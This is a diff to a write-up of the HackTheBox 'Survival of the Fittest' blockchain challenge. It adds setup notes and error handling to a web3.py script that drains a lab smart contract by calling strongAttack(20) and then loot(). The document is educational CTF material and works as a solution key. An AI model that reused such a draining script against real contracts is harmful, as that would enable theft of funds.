@@ -107,118 +107,152 @@ The "trick" (if you can call it that) is realizing you don't need to call `punch
 
 ---
 
+## Prerequisites
+
+Before running the solution, make sure you have:
+- Python 3.x installed
+- web3.py library (`pip install web3`)
+- An active HTB instance (instances expire after some time)
+
 ## Exploitation
 
-I wrote a Python script using web3.py to interact with the contract:
+I wrote a Python script using web3.py to interact with the contract. The script includes error handling to check if the contract exists and the instance is still active.
+
+### Setting Up
+
+First, update the connection details from your HTB instance:
 
 ```python
-from web3 import Web3
+RPC_URL = "http://94.237.123.119:37206/rpc"  # From HTB instance
+PRIVATE_KEY = "0x..."  # Your player private key
+TARGET_ADDRESS = "0x..."  # The Creature contract address
+```
 
-# connection info from HTB instance
-RPC_URL = "http://94.237.123.119:37206/rpc"
-PRIVATE_KEY = "0xc2751272b51463a92dda61b482e7b701859573e6dab3fef758bbf72afdb5339c"
-TARGET_ADDRESS = "0x2837b3F4bb0027C4920E69d8f13EB5F0e1B29916"
+### The ABI
 
-# minimal ABI for the functions we need
+I only included the functions we actually need to call:
+
+```python
 CREATURE_ABI = [
-    {
-        "inputs": [],
-        "name": "lifePoints",
-        "outputs": [{"type": "uint256"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [{"name": "_damage", "type": "uint256"}],
-        "name": "strongAttack",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "name": "loot",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
+    {"inputs": [], "name": "lifePoints", "outputs": [{"type": "uint256"}], 
+     "stateMutability": "view", "type": "function"},
+    {"inputs": [{"name": "_damage", "type": "uint256"}], "name": "strongAttack", 
+     "outputs": [], "stateMutability": "nonpayable", "type": "function"},
+    {"inputs": [], "name": "loot", "outputs": [], 
+     "stateMutability": "nonpayable", "type": "function"}
 ]
 ```
 
-### Step 1: Connect and Check State
+### Step 1: Connect and Validate
+
+The script first connects to the RPC and verifies the contract exists:
 
 ```python
 w3 = Web3(Web3.HTTPProvider(RPC_URL))
+
+if not w3.is_connected():
+    print("Failed to connect to RPC!")
+    return
+
+# Check if contract exists (important for expired instances)
+code = w3.eth.get_code(TARGET_ADDRESS)
+if code == b'' or code == '0x':
+    print("Contract not found - instance might have expired")
+    return
+```
+
+### Step 2: Check Initial State
+
+Read the creature's current state:
+
+```python
 account = w3.eth.account.from_key(PRIVATE_KEY)
 creature = w3.eth.contract(address=TARGET_ADDRESS, abi=CREATURE_ABI)
 
-life = creature.functions.lifePoints().call()
-bal = w3.eth.get_balance(TARGET_ADDRESS)
-print(f"Creature HP: {life}")  # Output: 20
-print(f"Contract balance: {bal} wei")  # Output: 10 wei
+life_points = creature.functions.lifePoints().call()  # Returns: 20
+balance = w3.eth.get_balance(TARGET_ADDRESS)  # Returns: 10 wei
 ```
 
-### Step 2: Attack the Creature
+### Step 3: Attack the Creature
+
+Call `strongAttack(20)` to reduce lifePoints from 20 to 0:
 
 ```python
-tx = creature.functions.strongAttack(20).build_transaction({
+attack_tx = creature.functions.strongAttack(20).build_transaction({
     'from': account.address,
     'nonce': w3.eth.get_transaction_count(account.address),
     'gas': 100000,
     'gasPrice': w3.eth.gas_price
 })
 
-signed = account.sign_transaction(tx)
-tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
-receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+signed_attack = account.sign_transaction(attack_tx)
+attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
+attack_receipt = w3.eth.wait_for_transaction_receipt(attack_hash)
+
+if attack_receipt['status'] != 1:
+    print("Attack failed!")
+    return
 ```
 
-After this transaction, `lifePoints` becomes 0.
+### Step 4: Verify and Loot
 
-### Step 3: Loot the Creature
+After the attack, verify HP is 0 then call `loot()`:
 
 ```python
-tx = creature.functions.loot().build_transaction({
+life_points = creature.functions.lifePoints().call()  # Now: 0
+
+loot_tx = creature.functions.loot().build_transaction({
     'from': account.address,
     'nonce': w3.eth.get_transaction_count(account.address),
     'gas': 100000,
     'gasPrice': w3.eth.gas_price
 })
 
-signed = account.sign_transaction(tx)
-tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
-receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+signed_loot = account.sign_transaction(loot_tx)
+loot_hash = w3.eth.send_raw_transaction(signed_loot.raw_transaction)
+loot_receipt = w3.eth.wait_for_transaction_receipt(loot_hash)
+
+final_balance = w3.eth.get_balance(TARGET_ADDRESS)  # Should be: 0
 ```
 
-The `loot()` function transfers the entire balance to my address since `lifePoints == 0`.
+The `loot()` function transfers the entire balance to our address since `lifePoints == 0`.
 
 ---
 
 ## Running the Solution
 
+1. **Spawn a new HTB instance** (if needed)
+2. **Update the credentials** in `solve.py`:
+   - `RPC_URL`
+   - `PRIVATE_KEY`
+   - `TARGET_ADDRESS`
+3. **Run the script**:
+
 ```bash
 python solve.py
 ```
 
-Output:
+### Expected Output
+
 ```
 Connected to RPC
-Creature HP: 20
-Contract balance: 10 wei
-
-Attacking...
-Attack successful: 0x...
-
-Creature HP now: 0
-
-Looting...
-Loot successful: 0x...
-
-Final contract balance: 0 wei
-Challenge solved!
+Life Points: 20
+Balance: 10 wei
+Attack tx: 0x...
+Life Points now: 0
+Loot tx: 0x...
+Final Balance: 0 wei
+Done!
 ```
 
-Flag obtained! 🎉
+If the instance has expired, you'll see:
+```
+Connected to RPC
+Contract not found at 0x...
+The instance might have expired. Spawn a new one and update the addresses.
+```
+
+Flag obtained! HTB{...}
 
 ---
 
@@ -226,27 +260,65 @@ Flag obtained! 🎉
 
 1. **Read the code carefully**: The solution was straightforward once I understood what the contract actually does.
 
-2. **Understand Solidity versions**: Knowing that 0.8+ has overflow protection saved me from going down the wrong path.
+2. **Understand Solidity versions**: Knowing that 0.8+ has overflow protection saved me from going down the wrong path initially.
 
-3. **Check win conditions**: The `isSolved()` function in Setup.sol clearly tells you what needs to happen.
+3. **Check win conditions first**: The `isSolved()` function in Setup.sol clearly shows what needs to happen - drain the contract balance to 0.
 
-4. **Use proper tooling**: web3.py made it easy to interact with the contract programmatically.
+4. **Instance management**: HTB blockchain instances expire after some time. Always check if the contract exists before trying to interact with it.
 
-This was a great introductory challenge for the HackTheBox Blockchain track. It teaches the basics of:
-- Connecting to an Ethereum RPC endpoint
-- Reading contract state
-- Signing and sending transactions
-- Understanding basic Solidity logic
+5. **Use proper tooling**: web3.py made it easy to interact with the contract programmatically without needing Foundry.
+
+### What I Learned
+
+This was a great introductory challenge for the HackTheBox Blockchain track. It teaches:
+- **RPC Connection**: How to connect to an Ethereum node via HTTP
+- **Contract Interaction**: Reading state variables and calling functions
+- **Transaction Flow**: Building, signing, and sending transactions
+- **ABI Usage**: How to construct minimal ABIs for specific functions
+- **Error Handling**: Checking transaction receipts and contract existence
+- **Solidity Basics**: Understanding state variables, require statements, and arithmetic operations
+
+### Common Issues
+
+- **"Contract not found"**: Your instance expired - spawn a new one
+- **"Failed to connect to RPC"**: Check if the RPC URL is correct and accessible
+- **Transaction fails**: Make sure you have the correct TARGET_ADDRESS for the Creature contract (not Setup)
+
+---
+
+## Quick Reference
+
+### Contract Functions Used
+- `lifePoints()` - View function, returns current HP (starts at 20)
+- `strongAttack(uint256 _damage)` - Deals damage to the creature
+- `loot()` - Transfers contract balance if HP is 0
+
+### Transaction Flow
+1. `strongAttack(20)` → Sets lifePoints to 0
+2. `loot()` → Transfers 10 wei to caller
+3. Contract balance becomes 0 → Challenge solved
+
+### File Structure
+```
+Survival of the Fittest/
+├── Creature.sol      # Target contract with game logic
+├── Setup.sol         # Deployment & win condition checker
+├── solve.py          # Python exploitation script
+└── README.md         # This writeup
+```
 
 ---
 
 ## Resources
 
-- [Solidity Documentation](https://docs.soliditylang.org/)
-- [web3.py Documentation](https://web3py.readthedocs.io/)
-- [HackTheBox Platform](https://www.hackthebox.com/)
+- [Solidity Documentation](https://docs.soliditylang.org/) - Official Solidity language docs
+- [web3.py Documentation](https://web3py.readthedocs.io/) - Python Ethereum library
+- [HackTheBox Platform](https://www.hackthebox.com/) - CTF challenges
+- [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) - Deep dive into Ethereum
 
-**Challenge Rating**: ⭐⭐☆☆☆ (Very Easy - Great for beginners!)
+**Challenge Rating**: ⭐⭐☆☆☆ (Very Easy - Perfect first blockchain challenge!)
+
+**Time to Solve**: ~5-10 minutes once you understand the code
 
 ---
 
